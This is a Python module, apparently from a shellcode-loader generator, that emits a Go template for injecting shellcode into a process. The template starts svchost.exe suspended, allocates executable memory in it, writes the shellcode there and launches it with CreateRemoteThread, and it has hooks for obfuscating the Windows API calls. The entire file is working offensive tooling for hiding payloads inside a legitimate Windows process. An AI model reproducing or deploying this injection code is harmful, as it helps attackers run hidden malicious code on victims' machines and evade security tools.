from string import Template

class spawnandinject:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return ['golang.org/x/sys/windows',
                'unsafe']

    def compilerOptions(self) -> list[str]:
        return ["golang.org/x/sys/windows"]

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return Template("""
    {transformers}

	procInfo := &windows.ProcessInformation{{}}
	startupInfo := &windows.StartupInfo{{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}}
    target := []byte("$target");
	{CreateProcessA}(0, uintptr(unsafe.Pointer(&target[0])), 0, 0, 1, windows.CREATE_SUSPENDED, 0, 0, uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(procInfo)))
	addr, _, _ := {VirtualAllocEx}(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.$memoryPermission)
    _, _, _ = {WriteProcessMemory}(uintptr(procInfo.Process), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
    
    thread, _, _ := {CreateRemoteThread}(uintptr(procInfo.Process), 0, 0, addr, 0, 0, 0)
    
	{WaitForSingleObject}(thread, 500)
	
    {CloseHandle}(thread);
""").substitute(target=self.target, memoryPermission=self.memoryPermission)